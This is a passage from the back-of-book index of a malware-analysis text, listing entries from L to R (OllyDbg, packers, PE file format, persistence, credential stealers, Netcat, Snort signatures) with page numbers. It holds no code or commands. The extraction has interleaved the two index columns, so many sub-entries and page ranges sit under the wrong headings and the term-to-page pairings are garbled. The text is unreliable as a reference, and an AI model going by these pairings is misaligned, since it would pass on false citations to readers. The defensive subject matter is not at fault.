<p class="calibre1">400–401</p>
<p class="calibre1">IDA Pro, 100</p>
<p class="calibre1">attempts to delete itself, 531</p>
<p class="calibre1">LockResource function, 596, 609</p>
<p class="calibre1">double-packed, 397</p>
<p class="calibre1">logging</p>
<p class="calibre1">hashing for identifying, 10</p>
<p class="calibre1">active window, 239</p>
<p class="calibre1">observing in natural habitat, 298</p>
<p class="calibre1">of credentials, 570–571</p>
<p class="calibre1">packed and obfuscated, 13–14</p>
<p class="calibre1">errors in malware, 674</p>
<p class="calibre1">running, 42–43</p>
<p class="calibre1">in OllyDbg, 197</p>
<p class="calibre1">safe environment for running, 14</p>
<p class="calibre1">logical operators, 75</p>
<p class="calibre1">searching for evidence of </p>
<p class="calibre1">logon, credential stealers, 234–241</p>
<p class="calibre1">encoding, 608</p>
<p class="calibre1">long pointer (LP) type, in Windows </p>
<p class="calibre1">self-deletion scripting code, 674</p>
<p class="calibre1">API, 136</p>
<p class="calibre1">types, 3–4</p>
<p class="calibre1">LookupPrivilegeValueA function, </p>
<p class="calibre1">malware analysis</p>
<p class="calibre1">247, 730</p>
<p class="calibre1">creating machine for, 31–33</p>
<p class="calibre1">loopback encoding algorithm, 277</p>
<p class="calibre1">danger of overanalysis, 308</p>
<p class="calibre1"><b class="calibre3">750</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p784"/>general rules, 4–5</p>
<p class="calibre1">dumping executable from, 390, </p>
<p class="calibre1">goals, 1–2</p>
<p class="calibre1">400, 469</p>
<p class="calibre1">risks of using VMware for, 36–37</p>
<p class="calibre1">finding device driver in, with </p>
<p class="calibre1">techniques, 2–3.  <i class="calibre4">See also</i> dynamic </p>
<p class="calibre1">WinDbg, 563</p>
<p class="calibre1">analysis; static analysis</p>
<p class="calibre1">finding  <i class="calibre4">kernel32.dll</i> in, 413–415</p>
<p class="calibre1">tools, 465–475</p>
<p class="calibre1">function dump, 174</p>
<p class="calibre1">malware behavior, 231–250</p>
<p class="calibre1">processes and, 147</p>
<p class="calibre1">backdoor, 232–234</p>
<p class="calibre1">memory-access violations, 177</p>
<p class="calibre1">botnets, 234</p>
<p class="calibre1">memory address operands, 69</p>
<p class="calibre1">credential stealers, 234–241</p>
<p class="calibre1">memory breakpoint, in OllyDbg, 188, </p>
<p class="calibre1">GINA interception, 235–236</p>
<p class="calibre1">190–191</p>
<p class="calibre1">hash dumping, 236–238</p>
<p class="calibre1">Memory dump window, in OllyDbg, </p>
<p class="calibre1">keystroke logging, 238–241</p>
<p class="calibre1">183</p>
<p class="calibre1">downloaders and launchers, </p>
<p class="calibre1">memory map, to locate DLLs, </p>
<p class="calibre1">231–232</p>
<p class="calibre1">546–547</p>
<p class="calibre1">indications of, 298–299</p>
<p class="calibre1">Memory Map window, in OllyDbg, </p>
<p class="calibre1">labs, 251–252</p>
<p class="calibre1">183–185</p>
<p class="calibre1">solutions, 566–586</p>
<p class="calibre1">memory window, WinDbg reading </p>
<p class="calibre1">persistence, 241–245</p>
<p class="calibre1">from, 210–211</p>
<p class="calibre1">DLL load-order hijacking, </p>
<p class="calibre1">Memoryze, 470</p>
<p class="calibre1">244–245</p>
<p class="calibre1">message box, malware creation of, 586</p>
<p class="calibre1">trojanized system binaries, </p>
<p class="calibre1">Message-Digest Algorithm 5 (MD5), 10</p>
<p class="calibre1">243–244</p>
<p class="calibre1">message flow, in Windows with and </p>
<p class="calibre1">Windows Registry for, 241–243</p>
<p class="calibre1">without hook injection, 259</p>
<p class="calibre1">privilege escalation, 245–247</p>
<p class="calibre1">Metasploit, 245, 418</p>
<p class="calibre1">SeDebugPrivilege, 246–247</p>
<p class="calibre1">methods</p>
<p class="calibre1">remote administration tool (RAT), </p>
<p class="calibre1">in C++ class, 427</p>
<p class="calibre1">233–234</p>
<p class="calibre1">overloading, 430–431</p>
<p class="calibre1">user-mode rootkits, 247–250</p>
<p class="calibre1">microcode, in x86 architecture, 66</p>
<p class="calibre1">IAT hooking, 248</p>
<p class="calibre1">Microsoft.  <i class="calibre4">See also</i> Windows</p>
<p class="calibre1">inline hooking, 248–250</p>
<p class="calibre1">Component Object Model (COM), </p>
<p class="calibre1">Mandiant</p>
<p class="calibre1">154–157</p>
<p class="calibre1">ApateDNS, 51–52</p>
<p class="calibre1">documentation, 453</p>
<p class="calibre1">Red Curtain, 388</p>
<p class="calibre1">firewall, 33</p>
<p class="calibre1">mangling, 430–431</p>
<p class="calibre1">Hyper-V, 31</p>
<p class="calibre1">manual unpacking, 389–397</p>
<p class="calibre1">Software Data Execution Prevention </p>
<p class="calibre1">MapViewOfFile function, 137–138, 459, </p>
<p class="calibre1">(DEP), 345</p>
<p class="calibre1">520, 527, 583</p>
<p class="calibre1">symbols, 212–215</p>
<p class="calibre1">MapVirtualKey function, 459</p>
<p class="calibre1">Virtual PC, 31</p>
<p class="calibre1">mass malware, 4</p>
<p class="calibre1">Visual Studio, 16</p>
<p class="calibre1">MD5 (Message-Digest Algorithm 5), 10</p>
<p class="calibre1">calling conventions, 121</p>
<p class="calibre1">media files, shellcode stored within, 423</p>
<p class="calibre1">wide character string, 11</p>
<p class="calibre1">memcmp function, 497</p>
<p class="calibre1">Microsoft Developer Network </p>
<p class="calibre1">memcpy function, 596</p>
<p class="calibre1">(MSDN), 414</p>
<p class="calibre1">memory</p>
<p class="calibre1">Microsoft signed binary, verifying, 48</p>
<p class="calibre1">addresses for global variables, 111</p>
<p class="calibre1">MIME (Multipurpose Internet </p>
<p class="calibre1">allocation for objects, 437</p>
<p class="calibre1">Mail Extensions) standard, </p>
<p class="calibre1">checking for VMware artifacts, 373</p>
<p class="calibre1">Base64 and, 277</p>
<p class="calibre1">copying PE sections into, 593–594</p>
<p class="calibre1">MmGetSystemRoutineAddress function, </p>
<p class="calibre1">224, 459</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">751</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p785"/>mneumonics, in instructions, 69</p>
<p class="calibre1">of modules, getting, 602</p>
<p class="calibre1">Module32First function, 459</p>
<p class="calibre1">for mutexes, 151</p>
<p class="calibre1">Module32Next function, 459</p>
<p class="calibre1">Names window, in IDA Pro, 91</p>
<p class="calibre1">modules</p>
<p class="calibre1">namespaces, files accessible via, </p>
<p class="calibre1">getting name of, 602</p>
<p class="calibre1">138–139</p>
<p class="calibre1">listing in WinDbg, 212</p>
<p class="calibre1">NAT (Network Address Translation), </p>
<p class="calibre1">modulo operation, 75, 112, 113</p>
<p class="calibre1">311</p>
<p class="calibre1">mov instruction, 73, 76, 79, 338, 500</p>
<p class="calibre1">for VMware, 34</p>
<p class="calibre1">position dependence, 409</p>
<p class="calibre1">Native API, in Windows, 159–161</p>
<p class="calibre1">movsb instruction, 82</p>
<p class="calibre1">native applications, 161</p>
<p class="calibre1">movsd instruction, 528</p>
<p class="calibre1">Navigate function, 155, 313</p>
<p class="calibre1">movs <i class="calibre4">x</i> instruction, 81</p>
<p class="calibre1">nc.  <i class="calibre4">See</i> Netcat (nc)</p>
<p class="calibre1">MS-DOS Stub Program, 22</p>
<p class="calibre1">Nebbett, Gary,  <i class="calibre4">Windows NT/2000 </i></p>
<p class="calibre1">MSDN (Microsoft Developer </p>
<p class="calibre1"> <i class="calibre4">Native API Reference</i>, 160</p>
<p class="calibre1">Network), 414</p>
<p class="calibre1">nested if statements, 113, 114–116</p>
<p class="calibre1">MSDN online, 19</p>
<p class="calibre1">net start cisvc command, 582</p>
<p class="calibre1">msg keyword, in Snort, 304</p>
<p class="calibre1">net start command, 43, 152, 581</p>
<p class="calibre1"> <i class="calibre4">msgina.dll</i>, and GINA, 235</p>
<p class="calibre1">Netcat (nc), 52–53, 470, 483, 634</p>
<p class="calibre1"> <i class="calibre4">msvcrt.dll</i>, imports from, 480</p>
<p class="calibre1">examining results, 485</p>
<p class="calibre1">mul instruction, 75</p>
<p class="calibre1">output when listening on </p>
<p class="calibre1">multibyte encoding algorithm, 276</p>
<p class="calibre1">port 80, 504</p>
<p class="calibre1">Multipurpose Internet Mail Exten-</p>
<p class="calibre1">reverse shells, 232–233</p>
<p class="calibre1">sions (MIME) standard, </p>
<p class="calibre1">NetScheduleJobAdd function, 459, 547</p>
<p class="calibre1">Base64 and, 277</p>
<p class="calibre1">NetShareEnum function, 459</p>
<p class="calibre1">multithreaded version, of Windows </p>
<p class="calibre1">network adapter, bridged, 34</p>
<p class="calibre1">reverse shell, 233</p>
<p class="calibre1">Network Address Translation </p>
<p class="calibre1">mutants, 151</p>
<p class="calibre1">(NAT), 311</p>
<p class="calibre1">mutexes, 58, 482, 513</p>
<p class="calibre1">for VMware, 34</p>
<p class="calibre1">creating, 483, 515</p>
<p class="calibre1">network countermeasures, 297</p>
<p class="calibre1">interprocess coordination with, </p>
<p class="calibre1">Network filter, in procmon, 46</p>
<p class="calibre1">151–152</p>
<p class="calibre1">network interface cards (NICs), </p>
<p class="calibre1">malware creation of, 585</p>
<p class="calibre1">virtual, 371</p>
<p class="calibre1">malware use of, 517</p>
<p class="calibre1">network signatures, 2, 297–322</p>
<p class="calibre1">MZ header, in PE executable, 594</p>
<p class="calibre1">analysis, 631–632</p>
<p class="calibre1">attacker’s perspective and, 321–322</p>
<p class="calibre1"><b class="calibre3">N</b></p>
<p class="calibre1">creating, 490</p>
<p class="calibre1">creating for Snort, 317</p>
<p class="calibre1">named constants, 102–103</p>
<p class="calibre1">creating XOR brute-force, 273</p>
<p class="calibre1">named pipes, watching for </p>
<p class="calibre1">Emerging Threats list of, 304</p>
<p class="calibre1">input on, 634</p>
<p class="calibre1">generating, 643</p>
<p class="calibre1">names</p>
<p class="calibre1">labs, 323–324</p>
<p class="calibre1">conventions for functions, 17</p>
<p class="calibre1">solutions, 626–645</p>
<p class="calibre1">hashed exported, for symbol </p>
<p class="calibre1">for malware infection detection, 2</p>
<p class="calibre1">resolution, 417–418</p>
<p class="calibre1">User-Agent field for, 637</p>
<p class="calibre1">for lab files, 27</p>
<p class="calibre1">networking APIs, 143–145</p>
<p class="calibre1">of locations, changing in </p>
<p class="calibre1">networks</p>
<p class="calibre1">IDA Pro, 100</p>
<p class="calibre1">analysis, 538–539</p>
<p class="calibre1">for malicious DLL, 257</p>
<p class="calibre1">capturing traffic, 580</p>
<p class="calibre1">of malware, string comparison, 666</p>
<p class="calibre1">faking, 51–53</p>
<p class="calibre1">mangling in C++, 431</p>
<p class="calibre1">finding code, 313</p>
<p class="calibre1"><b class="calibre3">752</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p786"/>host-only, 32–33</p>
<p class="calibre1">NULL terminator, 11</p>
<p class="calibre1">indications of functioning, 572</p>
<p class="calibre1">Number of Opcode Bytes option, 335</p>
<p class="calibre1">knowing sources of content, 314</p>
<p class="calibre1">NXDOMAIN option, 52</p>
<p class="calibre1">server and client sides, 144–145</p>
<p class="calibre1">virtual, 32</p>
<p class="calibre1"><b class="calibre3">O</b></p>
<p class="calibre1">new operator, 435, 437, 712</p>
<p class="calibre1">!object command, in WinDbg, 552</p>
<p class="calibre1">nibble, 278</p>
<p class="calibre1">object-oriented programming, </p>
<p class="calibre1">NICs (network interface cards), </p>
<p class="calibre1">427–432</p>
<p class="calibre1">virtual, 371</p>
<p class="calibre1">overloading and mangling, </p>
<p class="calibre1">No Pill technique, 375.  <i class="calibre4">See also</i> sldt </p>
<p class="calibre1">430–431</p>
<p class="calibre1">instruction (No Pill)</p>
<p class="calibre1">this pointer, 428–430</p>
<p class="calibre1">NopBytes function, 339</p>
<p class="calibre1">objects, creating and destroying </p>
<p class="calibre1">nonleaf functions, 446</p>
<p class="calibre1">in C++, 437</p>
<p class="calibre1">nonprivileged mode, 177</p>
<p class="calibre1">OEP.  <i class="calibre4">See</i> original entry point (OEP)</p>
<p class="calibre1">nonvirtual functions, vs. virtual, </p>
<p class="calibre1">OfficeMalScanner, 470</p>
<p class="calibre1">432–436</p>
<p class="calibre1">offset links, in IDA Pro, 93</p>
<p class="calibre1">NOP instruction, in x86 </p>
<p class="calibre1">OleInitialize function, 154, 460, 518</p>
<p class="calibre1">architecture, 76</p>
<p class="calibre1">OllyDbg, 168, 179–201, 364, 470</p>
<p class="calibre1">NOP sequence, 337</p>
<p class="calibre1">analysis, 691</p>
<p class="calibre1">NOP sled, shellcode and, 422–423</p>
<p class="calibre1">assistance features, 197</p>
<p class="calibre1">NOP-ing out instructions with </p>
<p class="calibre1">breakpoints, 188–191</p>
<p class="calibre1">IDA Pro, 340</p>
<p class="calibre1">choosing to debug arguments, 532</p>
<p class="calibre1">Norman SandBox, 40</p>
<p class="calibre1">debug window from, 173</p>
<p class="calibre1">Norton Ghost, 30</p>
<p class="calibre1">default settings for exceptions, 362</p>
<p class="calibre1">noscript tags, malware commands </p>
<p class="calibre1">disassembly view, 533</p>
<p class="calibre1">from, 638</p>
<p class="calibre1">examining hook in, 579–580</p>
<p class="calibre1">NSPack, 388</p>
<p class="calibre1">exception handling, 194–195</p>
<p class="calibre1">NT namespace, 138</p>
<p class="calibre1">executing code, 186–187</p>
<p class="calibre1">NtContinue function, 161, 386</p>
<p class="calibre1">finding function addresses </p>
<p class="calibre1">NtCreateFile function, 215, 224</p>
<p class="calibre1">with, 410</p>
<p class="calibre1"> <i class="calibre4">ntdll.dll</i>, 17, 159, 352, 414</p>
<p class="calibre1">forcing code disassembly, 689</p>
<p class="calibre1">NTGlobalFlag flag, 355, 659–660</p>
<p class="calibre1">interface, 181–183</p>
<p class="calibre1">ntohl function, 191</p>
<p class="calibre1">as just-in-time debugger, 411, 696</p>
<p class="calibre1"> <i class="calibre4">ntoskrnl.exe</i>, 159</p>
<p class="calibre1">labs, 202–203</p>
<p class="calibre1">malicious drivers and, 207</p>
<p class="calibre1">solutions, 530–548</p>
<p class="calibre1">NtQueryDirectoryFile function, 459, 559</p>
<p class="calibre1">loading DLLs, 191–192, 401</p>
<p class="calibre1">as hook function, 556–558</p>
<p class="calibre1">loading malware, 180–181, 656</p>
<p class="calibre1">NtQueryInformationFile function, 160</p>
<p class="calibre1">loading packed executable in, 389</p>
<p class="calibre1">NtQueryInformationKey function, 160</p>
<p class="calibre1">memory map to examine DLL load </p>
<p class="calibre1">NtQueryInformationProcess function, </p>
<p class="calibre1">locations, 546</p>
<p class="calibre1">352, 460</p>
<p class="calibre1">Memory Map window, 183–185</p>
<p class="calibre1">NtQueryInformationThread function, 160</p>
<p class="calibre1">opening malware with, 538</p>
<p class="calibre1">NtQuerySystemInformation function, 160</p>
<p class="calibre1">OutputDebugString format string </p>
<p class="calibre1">NtReadFile function, 160</p>
<p class="calibre1">vulnerability, 365</p>
<p class="calibre1">NtSetInformationProcess function, 460</p>
<p class="calibre1">packed program and, 387</p>
<p class="calibre1">NtWriteFile function, 160, 215</p>
<p class="calibre1">patching, 195–196</p>
<p class="calibre1">NULL bytes, avoiding in </p>
<p class="calibre1">pausing before TLS callback, 361</p>
<p class="calibre1">shellcode, 421</p>
<p class="calibre1">plug-ins, 197–200, 354</p>
<p class="calibre1">NULL-preserving single-byte XOR </p>
<p class="calibre1">encoding, 273–274</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">753</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p787"/>OllyDbg,  <i class="calibre4">continued</i></p>
<p class="calibre1">transferring execution to, 386</p>
<p class="calibre1">premature termination of </p>
<p class="calibre1">unpacking stub and, 384</p>
<p class="calibre1">program in, 662</p>
<p class="calibre1">orphaned process, 490–491</p>
<p class="calibre1">rebasing, 184–185</p>
<p class="calibre1">OSR Driver Loader, 470–471</p>
<p class="calibre1">Run Trace option, 395</p>
<p class="calibre1">OSs (operating systems), backup </p>
<p class="calibre1">screen capture decoding with, 616</p>
<p class="calibre1">images of, 30</p>
<p class="calibre1">scriptable debugging, 200–201</p>
<p class="calibre1">Outlook Express, 579–580</p>
<p class="calibre1">shellcode analysis, 196–197</p>
<p class="calibre1">output functions, tracing from, 286</p>
<p class="calibre1">strncmp function in, 663</p>
<p class="calibre1">OutputDebugString function, 353, </p>
<p class="calibre1">tracing, 192–194</p>
<p class="calibre1">460, 664</p>
<p class="calibre1">viewing threads and stacks, </p>
<p class="calibre1">overanalysis, danger of, 308</p>
<p class="calibre1">185–186</p>
<p class="calibre1">overloading, 430–431</p>
<p class="calibre1">vulnerabilities in, 363–365</p>
<p class="calibre1">WinUpack and, 400</p>
<p class="calibre1"><b class="calibre3">P</b></p>
<p class="calibre1">OllyDump, 198, 389–390</p>
<p class="calibre1">packed DLLs, 401</p>
<p class="calibre1">dumping unpacked program, 694</p>
<p class="calibre1">packed executables</p>
<p class="calibre1">Find OEP by Section Hop (Trace </p>
<p class="calibre1">detecting, 23</p>
<p class="calibre1">Into), 686</p>
<p class="calibre1">entropy calculation for, 387–388</p>
<p class="calibre1">Find OEP by Section Hop (Trace </p>
<p class="calibre1">identifying, 387–388</p>
<p class="calibre1">Over), 685, 687</p>
<p class="calibre1">loading in OllyDbg, 389</p>
<p class="calibre1">forcing code disassembly, 686</p>
<p class="calibre1">repairing import table for, 390</p>
<p class="calibre1">opcodes, in x86 architecture, 67, 70</p>
<p class="calibre1">packed files</p>
<p class="calibre1">open source sniffer, 53</p>
<p class="calibre1">indications of, 480</p>
<p class="calibre1">OpenMutex function, 152, 460, 522</p>
<p class="calibre1">strings and, 483</p>
<p class="calibre1">OpenProcess function, 460</p>
<p class="calibre1">packed malware, 13–14</p>
<p class="calibre1">OpenProcessToken function, 247, 730</p>
<p class="calibre1">detecting with PEiD, 14</p>
<p class="calibre1">OpenSCManager function, 153, 460, 514, </p>
<p class="calibre1">packers, 383–402</p>
<p class="calibre1">515, 549, 550, 554</p>
<p class="calibre1">anatomy, 384–387</p>
<p class="calibre1">OpenService function, 549, 550</p>
<p class="calibre1">labs, 403</p>
<p class="calibre1">OpenSSL, 281</p>
<p class="calibre1">solutions, 684–695</p>
<p class="calibre1">operands</p>
<p class="calibre1">resolving imports, 385</p>
<p class="calibre1">formatting in IDA Pro, 100</p>
<p class="calibre1">tail jump, 386</p>
<p class="calibre1">in x86 architecture, 69, 70</p>
<p class="calibre1">tips and tricks for common, </p>
<p class="calibre1">operating systems (OSs), backup </p>
<p class="calibre1">397–400</p>
<p class="calibre1">images of, 30</p>
<p class="calibre1">unpacking illustrated, 386–387</p>
<p class="calibre1">Operation filter, in procmon, 45</p>
<p class="calibre1">packet listing, in Wireshark, 53</p>
<p class="calibre1">operational replication, 308</p>
<p class="calibre1">packet sniffing, with Wireshark, 53–55</p>
<p class="calibre1">operations security (OPSEC), 299</p>
<p class="calibre1">packing algorithm, program to run in </p>
<p class="calibre1">or instruction, 76</p>
<p class="calibre1">reverse, 389</p>
<p class="calibre1">OR logical operator, in x86 </p>
<p class="calibre1">padding characters, Base64 </p>
<p class="calibre1">architecture, 75</p>
<p class="calibre1">string and, 279</p>
<p class="calibre1">ordinal, executable import of func-</p>
<p class="calibre1">Parallels, 31</p>
<p class="calibre1">tions by, 16–17, 43</p>
<p class="calibre1">parent classes in C++, 432</p>
<p class="calibre1">original entry point (OEP)</p>
<p class="calibre1">child class functions from, 436</p>
<p class="calibre1">code around, 399</p>
<p class="calibre1">parent-child relationships, </p>
<p class="calibre1">in DLLs, 401</p>
<p class="calibre1">in classes, 432</p>
<p class="calibre1">finding, 391–395</p>
<p class="calibre1">parsing routines</p>
<p class="calibre1">with automated tools, 391–392</p>
<p class="calibre1">analyzing, 318–320</p>
<p class="calibre1">manually, 392–395</p>
<p class="calibre1">IDA Pro graph of, 318–319</p>
<p class="calibre1">indications of, 694</p>
<p class="calibre1">pass-the-hash attacks, 236</p>
<p class="calibre1"><b class="calibre3">754</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p788"/>password check function, 533</p>
<p class="calibre1">Phatbot, VMware detection, 375–376</p>
<p class="calibre1">testing if disabled, 534</p>
<p class="calibre1">phishing, targeted, 299</p>
<p class="calibre1">passwords, 661</p>
<p class="calibre1">PIC (position-independent code), </p>
<p class="calibre1">getting correct, 665</p>
<p class="calibre1">408–409</p>
<p class="calibre1">sniffing, 53</p>
<p class="calibre1">pipe symbol (|), in Snort, 304</p>
<p class="calibre1">PatchByte function, 337, 339</p>
<p class="calibre1">plug-ins</p>
<p class="calibre1">PatchGuard, 227</p>
<p class="calibre1">for extending IDA Pro, 103–106</p>
<p class="calibre1">patching, in OllyDbg, 195–196</p>
<p class="calibre1">in OllyDbg, 197–200, 354</p>
<p class="calibre1">payload rule options, in Snort, 303</p>
<p class="calibre1">PEiD, running of executables, 14</p>
<p class="calibre1">PCRE (Perl Compatible Regular </p>
<p class="calibre1">third-party, for Internet </p>
<p class="calibre1">Expression) notation, in </p>
<p class="calibre1">Explorer, 157</p>
<p class="calibre1">Snort, 305, 316</p>
<p class="calibre1">pointers, handles vs., 137</p>
<p class="calibre1">pcre Snort rule keyword, 305</p>
<p class="calibre1">Poison Ivy, 189, 234</p>
<p class="calibre1">.pdata section, in PE file, 22</p>
<p class="calibre1">tracing, 193–194</p>
<p class="calibre1">PDF Dissector, 471</p>
<p class="calibre1">use of VirtualAlloc function, </p>
<p class="calibre1">.  <i class="calibre4">pdf</i> documents, 704–712</p>
<p class="calibre1">189–190</p>
<p class="calibre1">analyzing with Process Explorer, 50</p>
<p class="calibre1">polling, 239</p>
<p class="calibre1">objects created for, 716</p>
<p class="calibre1">polymorphism, 434</p>
<p class="calibre1">PDF Tools, 471</p>
<p class="calibre1">pop instruction, 77, 79</p>
<p class="calibre1">PE Explorer, 26, 471</p>
<p class="calibre1">after call, 409–411</p>
<p class="calibre1">unpacking plug-ins, 388</p>
<p class="calibre1">and tail jump, 394</p>
<p class="calibre1">PE file format.  <i class="calibre4">See</i> Portable Execut-</p>
<p class="calibre1">pop-up ads, 560–561</p>
<p class="calibre1">able (PE) file format</p>
<p class="calibre1">popa instruction, 79, 244</p>
<p class="calibre1">PEB (Process Environment Block) </p>
<p class="calibre1">popad instruction, 79</p>
<p class="calibre1">structure, 352, 591–592</p>
<p class="calibre1">port 80, backdoor and, 232</p>
<p class="calibre1">documented, 354</p>
<p class="calibre1">Portable Executable (PE) file format, </p>
<p class="calibre1">PEBrowse Professional, 26</p>
<p class="calibre1">14–15, 396</p>
<p class="calibre1">PECompact, 397–398</p>
<p class="calibre1">copying sections into memory, </p>
<p class="calibre1">PeekNamedPipe function, 460, 634</p>
<p class="calibre1">593–594</p>
<p class="calibre1">PEiD, 471, 478, 479–480</p>
<p class="calibre1">examining file structure, 486</p>
<p class="calibre1">detecting packers with, 14</p>
<p class="calibre1">header vulnerabilities, OllyDbg, </p>
<p class="calibre1">KANAL output, 610</p>
<p class="calibre1">363–365</p>
<p class="calibre1">peripheral devices, connecting and </p>
<p class="calibre1">headers and sections, 21–26</p>
<p class="calibre1">disconnecting, 34–35</p>
<p class="calibre1">summary information, 26</p>
<p class="calibre1">Perl Compatible Regular Expression </p>
<p class="calibre1">IDA Pro support for, 87</p>
<p class="calibre1">(PCRE) notation, in Snort, </p>
<p class="calibre1">indications in, 729</p>
<p class="calibre1">305, 316</p>
<p class="calibre1">packed executables formatting of, </p>
<p class="calibre1">persistence, 241–245, 572</p>
<p class="calibre1">385</p>
<p class="calibre1">AppInit_DLLs for, 575</p>
<p class="calibre1">parsing export data, 415–417</p>
<p class="calibre1">DLL load-order hijacking, 244–245</p>
<p class="calibre1">PEview for examining, 22–24</p>
<p class="calibre1">of registry, 139</p>
<p class="calibre1">rebasing and, 184</p>
<p class="calibre1">trojanized system binaries, 243–244</p>
<p class="calibre1">Resource Hacker tool for viewing, </p>
<p class="calibre1">Windows Registry for, 241–243</p>
<p class="calibre1">25–26</p>
<p class="calibre1">Petite, 398</p>
<p class="calibre1">resource section, 254, 567</p>
<p class="calibre1">PEview, 471, 478</p>
<p class="calibre1">section headers, and OllyDbg </p>
<p class="calibre1">examining PE files with, 22–24</p>
<p class="calibre1">crash, 364</p>
<p class="calibre1">finding base address with, 545</p>
<p class="calibre1">.tls section, 360, 662</p>
<p class="calibre1">original and trojanized versions of </p>
<p class="calibre1">ports, malware use of, 52</p>
<p class="calibre1"> <i class="calibre4">cisvc.exe</i>, 584–585</p>
<p class="calibre1">position-independent code (PIC), </p>
<p class="calibre1">PhantOm plug-in, 354, 658, 659, 665</p>
<p class="calibre1">408–409</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">755</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p789"/>POST method, 309</p>
<p class="calibre1">function to open and </p>
<p class="calibre1">printf function, 120</p>
<p class="calibre1">manipulate, 20</p>
<p class="calibre1">call compiled for 32-bit </p>
<p class="calibre1">hidden, 566</p>
<p class="calibre1">processor, 445</p>
<p class="calibre1">interprocess coordination with </p>
<p class="calibre1">call compiled for 64-bit </p>
<p class="calibre1">mutexes, 151–152</p>
<p class="calibre1">processor, 446</p>
<p class="calibre1">Properties window for, 48</p>
<p class="calibre1">IDA Pro problems recognizing, 502</p>
<p class="calibre1">resuming suspended, 595</p>
<p class="calibre1">privilege escalation, 245–247</p>
<p class="calibre1">starting and replacing, 596</p>
<p class="calibre1">SeDebugPrivilege, 246–247</p>
<p class="calibre1">ProcessHeap flag, in PEB structure, 355</p>
<p class="calibre1">privileged mode, 177</p>
<p class="calibre1">procmon.  <i class="calibre4">See</i> Process Monitor </p>
<p class="calibre1">ProcDump, 400</p>
<p class="calibre1">(procmon)</p>
<p class="calibre1">Process activity filter, in procmon, 46</p>
<p class="calibre1">programs.  <i class="calibre4">See</i> executables</p>
<p class="calibre1">process context, 158</p>
<p class="calibre1">prologue</p>
<p class="calibre1">Process Environment Block (PEB) </p>
<p class="calibre1">64-bit code, 446–447</p>
<p class="calibre1">structure, 352, 591–592</p>
<p class="calibre1">in functions, 77</p>
<p class="calibre1">documented, 354</p>
<p class="calibre1">Properties window, in Process </p>
<p class="calibre1">Process Explorer, 58, 472, 483</p>
<p class="calibre1">Explorer, 48</p>
<p class="calibre1">comparing strings, 49</p>
<p class="calibre1">protocols, attackers mimicking </p>
<p class="calibre1">Dependency Walker, 49</p>
<p class="calibre1">existing, 309–310</p>
<p class="calibre1">for finding DLL injection, 589</p>
<p class="calibre1"> <i class="calibre4">psapi.dll</i>, 586, 600</p>
<p class="calibre1">Verify option, 48–49</p>
<p class="calibre1">push instruction, 77, 79, 244, 329, 689</p>
<p class="calibre1">viewing processes with, 47–50</p>
<p class="calibre1">vs. mov, 120</p>
<p class="calibre1">Process Hacker, 472</p>
<p class="calibre1">with return instruction for </p>
<p class="calibre1">Process Monitor (procmon), 43–46, </p>
<p class="calibre1">tail jump, 399</p>
<p class="calibre1">472, 483</p>
<p class="calibre1">to start functions in disassembly, 394</p>
<p class="calibre1">boot logging options, 46</p>
<p class="calibre1">Pwdump, 236</p>
<p class="calibre1">display, 44</p>
<p class="calibre1">PyCommand Python script, 200–201</p>
<p class="calibre1">Filter dialog, 484</p>
<p class="calibre1">PyCrypto cryptography library, </p>
<p class="calibre1">filtering in, 44–46</p>
<p class="calibre1">290, 625</p>
<p class="calibre1">filters on toolbar, 46</p>
<p class="calibre1">potential pitfalls, 626</p>
<p class="calibre1">reviewing results, 58</p>
<p class="calibre1">Python, 472</p>
<p class="calibre1">toggling event capture on </p>
<p class="calibre1">IDAPython, 105–106</p>
<p class="calibre1">and off, 749</p>
<p class="calibre1">program to decode Base64-</p>
<p class="calibre1">Process Name filter, in procmon, 45</p>
<p class="calibre1">encoded string, 289</p>
<p class="calibre1">Process Properties window, </p>
<p class="calibre1">PyCommand script, 200–201</p>
<p class="calibre1">Strings tab, 49</p>
<p class="calibre1">script for converting data to string, </p>
<p class="calibre1">process replacement, 48–49, 257–259</p>
<p class="calibre1">500–501</p>
<p class="calibre1">Process32First function, 255, 263, 460</p>
<p class="calibre1">Process32Next function, 255, 263, 460</p>
<p class="calibre1"><b class="calibre3">Q</b></p>
<p class="calibre1">processes</p>
<p class="calibre1">query, of I/O communication port, </p>
<p class="calibre1">creating, 147–149, 590</p>
<p class="calibre1">375–377</p>
<p class="calibre1">dumping from memory, 390, 400</p>
<p class="calibre1">QueryPerformanceCounter function, </p>
<p class="calibre1">dynamically resolving enumera-</p>
<p class="calibre1">358–359, 460, 667–668</p>
<p class="calibre1">tion imports, 600–601</p>
<p class="calibre1">QueueUserAPC function, 263, 460</p>
<p class="calibre1">EBX register of suspended newly </p>
<p class="calibre1">created, 591</p>
<p class="calibre1"><b class="calibre3">R</b></p>
<p class="calibre1">enumerating, 601</p>
<p class="calibre1">for following running malware, </p>
<p class="calibre1">radio-frequency identification (RFID) </p>
<p class="calibre1">147–149</p>
<p class="calibre1">tokens, 235</p>
<p class="calibre1">RaiseException function, 157, 344</p>
<p class="calibre1"><b class="calibre3">756</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p790"/>Random function, 313, 314</p>
<p class="calibre1">scripting with  <i class="calibre4">.reg</i> files, 142–143</p>
<p class="calibre1">random number generator seed, 484</p>
<p class="calibre1">snapshots with Regshot, 50–51</p>
<p class="calibre1">RAT (remote administration tool), </p>
<p class="calibre1">VMware artifacts in, 371</p>
<p class="calibre1">233–234</p>
